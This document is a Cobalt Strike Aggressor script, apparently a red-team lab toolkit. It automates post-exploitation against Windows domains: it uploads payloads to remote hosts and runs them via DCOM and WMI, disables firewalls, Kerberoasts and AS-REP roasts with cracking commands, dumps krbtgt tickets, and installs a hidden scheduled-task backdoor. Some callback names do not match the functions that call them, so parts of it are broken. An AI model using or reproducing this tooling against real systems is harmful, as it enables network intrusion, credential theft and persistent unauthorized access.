# $1 is beacon id
# $2 target
# $3 selected listener

#GLOBAL VARIABLES
$SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
$INVOKE_DCOM_PATH   = getFileProper("C:\\Tools","Invoke-DCOM.ps1");
$POWERVIEW_PATH     = getFileProper("C:\\Tools\\PowerSploit\\Recon", "PowerView.ps1");
$RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","Rubeus.exe");
$SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
$ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
$SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
$SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
$GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");

#TEST FUNCTION
command beacons {
   local('$entry $key $value');
   foreach $entry (beacons()) {
      println("== " . $entry['id'] . " ==");
      foreach $key => $value ($entry) {
         println("$[20]key : $value");
      }
      println();
   }
}

#generate random printable text of $length
sub rand_alphanum {
    local('$length $out $charstr $i $index');
    $length = $1;
    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
    $out = '';
    for($i = 0; $i < $length; $i++)
    {
        $index = rand(strlen($charstr));
        $out = $out . substr($charstr, $index, $index + 1);
    }
    return $out;
}

#ADD INVOKE_DCOM TO JUMP COMMAND
sub invoke_dcom
{
    local('$handle $script $oneliner $filename $payload');

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ", $payload);

    println("Invoke-DCOM Oneliner: " . $oneliner);
    println("Filename: ". $filename);
    #execute script from powerpick
    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\ $+ $filename $+ ", $oneliner);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)

#ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
sub invoke_dcom_remoteexec
{
    local('$handle $script $oneliner $filename $payload');

    #beacon acknowledgement
    btask($1, "Task Beacon to run remote-exec on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command  $+ $3 $+ ", $oneliner);
}
beacon_remote_exec_method_register("invoke-dcom", "Remote execute via powershell Invoke-DCOM", &invoke_dcom_remoteexec);

#ADD SHARPWMI TO JUMP COMMAND
sub sharpwmi
{
    local('$binpath $uploadpath $filename $args $payload')

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
    println("Running jump sharpwmi.")

    #define binary path
    $binpath = $SHARPWMI_BIN_PATH;

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ";
    println("Uploading binary to:" . $uploadpath);
    bupload_raw($1, $uploadpath, $payload);

    #execute script from powerpick
    $args = "action=exec computername= $+ $2 $+  command= $+ $uploadpath $+ ";
    println("Execution args: " . $args);
    bexecute_assembly($1, $binpath, $args);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)

alias import_powerview {
    bpowershell_import($1, $POWERVIEW_PATH);
}
beacon_command_register(
    "import_powerview",
    "Imports Powerview into current beacon"
);

#FIREWALL ALIASES
alias shieldsdown {
    #This function creates a service on the remote host, starts it, and cleans it up.
    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
beacon_command_register(
    "shieldsdown",
    "Disables host firewall"
);

alias openport {
    #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
    bpowerpick($1, "powerpick new-netfirewallrule -displayname \" $+ $2 $- -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
}
beacon_command_register(
    "openport",
    "Opens the port specified",
    "Opens the port specified"
);

#EXECUTE ASSEMBLY ALIAS
alias rubeus {
    bexecute_assembly($1, $RUBEUS_PATH, $2)
}
beacon_command_register(
    "rubeus",
    "Execute Assmembly of Rubeus",
    "Execute Assmembly of Rubeus\n\nArgs must be wrapped in double quotes"
);

alias seatbelt {
    bexecute_assembly($1, $SEATBELT_PATH, $2)
}
beacon_command_register(
    "seatbelt",
    "Execute Assmembly of Seatbelt",
    "Execute Assmembly of Seatbelt\n\nArgs must be wrapped in double quotes"
);

alias adsearch {
    bexecute_assembly($1, $ADSEARCH_PATH, $2)
}
beacon_command_register(
    "adsearch",
    "Execute Assmembly of ADSearch",
    "Execute Assmembly of ADSearch\n\nArgs must be wrapped in double quotes"
);

#KERBEROASTING
#FIND TARGETS
alias kerberoast_findtargets {
    bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
}
beacon_command_register(
    "kerberoast_findtargets",
    "User PowerView to find SPNs"
);

#GRABBING KRB5TGS HASH
sub kerberoast_tgsreq_cb{
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5tgs --wordlist=wordlist <user>'");
}
alias kerberoast_tgsreq{
    bexecute_assembly($1, $RUBEUS_PATH, 'kerberoast /nowrap /user:' . $2, $null, &kerberoast_tgsreq_cb);
}
beacon_command_register(
    "kerberoast_tgsreq",
    "Request the TGS with Rubeus"
);

#AS-REP ROASTING
#FIND TARGETS
alias asreproast_findtargets {
   bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
}
beacon_command_register(
    "asreproast_findtargets",
    "Find AS-REP roastable targets"
);

#REQUEST HASH
sub asreproast_requesthash_cb {
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5asrep --wordlist=wordlist <user>'");
}
alias asreproast_requesthash {
    bexecute_assembly($1, $RUBEUS_PATH, 'asreproast /nowrap /user:' . $2, $null, &asreproast_requesthash_cb);
}
beacon_command_register(
    "asreproast_findtargets",
    "Get the specified user KRB5ASREP hash"
);

#UNCONSTRAINED DELEGATION
#FINDING TARGETS
alias unconstdel_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
}

#CONSTRAINED DELEGATION
#FINDING TARGETS
alias constdel_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
}
beacon_command_register(
    "constdel01_findtargets",
    "Find Constrained Delegation Targets"
);

#TRIAGE THEN DUMP TGT
sub constdel_stealtgt_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$hostname $regx_luid $luid');

    $hostname = lc(binfo($1, "computer"));
    #println("hostname: " . $hostname);

    $regx_luid = '(0x\w+).*' . $hostname . '\$';
    
    $luid = matches($2, $regx_luid)[0];

    blog($1, $2);
    blog($1, "Targetting LUID:" . $luid);

    #dump ticket for krbtgt with $luid
    bexecute_assembly($1, $RUBEUS_PATH, "dump /nowrap /service:krbtgt /luid:" . $luid);
}
alias constdel02_stealtgt {
    #execute assembly and pass results to helper sub, run LUID
    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel02_stealtgt_cb);
}
beacon_command_register(
    "constdel02_stealtgt",
    "Steal the local machine TGT"
);

#ROLE BASED CONSTRAINED DELEGATION
#FINDING TARGETS
alias rbcd_findtargets {
    bpowerpick($1, 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }');
}
beacon_command_register(
    "rbcd_findtargets",
    "Find Role Based Constrained Delegation Machines");

#PERSISTANCE METHODS
## SCHEDULED TASKS
#execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly
alias sharpersist_schtask {
    $rand = rand_alphanum(4);
    
    #not encoding properly!
    $b64payload = base64_encode($2);
    
    blog($1, "Encoding " . $2);
    blog($1, "Base64: " . $b64payload);

    $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
    $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
    $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    blog($1, "Executing SharPersist " . $parameters);

    bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
}
beacon_command_register(
    "sharpersist_schtask",
    "Install a backdoor in scheduled task",
    "Usage: sharpersist_schtask [powershell commands]"
);

#PRIVILEGE ESCALATION HELPERS
##UNQUOTED SERVICE PATHS
alias privesc_unquotedpath {
    bexecute_assembly($1, $SHARPUP_PATH, "audit UnquotedServicePath");
}
beacon_command_register(
    "privesc_unquotedpath",
    "Checkes Unquoted Paths",
    "Uses SharpUp to check for unquoted service paths"
);

##WEAK SERVICE PERMS
sub privesc_weaksvcperms_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$regx_service $service $script $oneliner');
    
    $regx_service = '\sService \'(\w+)\'';
    
    $services = matches($2, $regx_service);
    
    blog($1, $2);

    foreach $service ($services) {
        blog($1, "Vulnerable Services: ". $service);

        #import the script
        $handle = openf($GETSERVICEACL_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        bpowerpick($1, "get-serviceacl -name " . $service . " | select -expand Access", $oneliner);

    }
}
alias privesc_weaksvcperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServices", $null, &privesc_weaksvcperms_cb);
}
beacon_command_register(
    "privesc_weaksvcperms",
    "Checkes for weak service permissions",
    "Uses SharpUp to check for weak service permissions"
);

##WEAK SERVICE BINARY PERMS
sub privesc_weaksvcbinaryperms_cb {
    blog($1, $2);
    blog($1, "Use 'powerpick get-acl -Path <binpath> | fl' to check permissions");
    
}

alias privesc_weaksvcbinaryperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServiceBinaries", $null, &privesc_weaksvcbinaryperms_cb);
}
beacon_command_register(
    "privesc_weaksvcbinaryperms",
    "Checkes for weak service binary permissions",
    "Uses SharpUp to check for weak service binary permissions"
);
